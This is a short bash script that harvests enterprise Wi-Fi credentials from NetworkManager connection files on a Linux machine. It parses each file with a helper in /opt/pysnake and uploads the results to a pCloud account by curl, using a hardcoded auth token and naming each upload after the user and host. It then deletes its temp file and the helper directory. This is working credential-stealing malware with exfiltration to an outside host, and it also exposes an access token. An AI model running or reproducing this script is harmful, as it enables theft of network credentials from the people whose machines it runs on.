#!/usr/bin/env bash

AUTH_TOKEN="5AEgF7ZRoJb7ZIH6pVVtwEJ8MH0RcVLR5imRKGhX0"
FOLDER_ID="12961249642"

for i in /etc/NetworkManager/system-connections/*
do
	if grep -q "identity" "${i}"
	then
		/opt/pysnake/parser.py "${i}"
		filePath="/tmp/wifi-nmconnection-tracker.txt"
		i="`cat ${filePath} | head -n1 | cut -d: -f2 | tr [' '] ['_']`"
		curl -s -o /dev/null -X PUT -T "${filePath}" \
                "https://api.pcloud.com/uploadfile?auth=${AUTH_TOKEN}&folderid=${FOLDER_ID}&filename=$(users | head -n1)@${HOSTNAME}-${i}.key"
		rm "${filePath}"
	fi
done

rm -rf /opt/pysnake
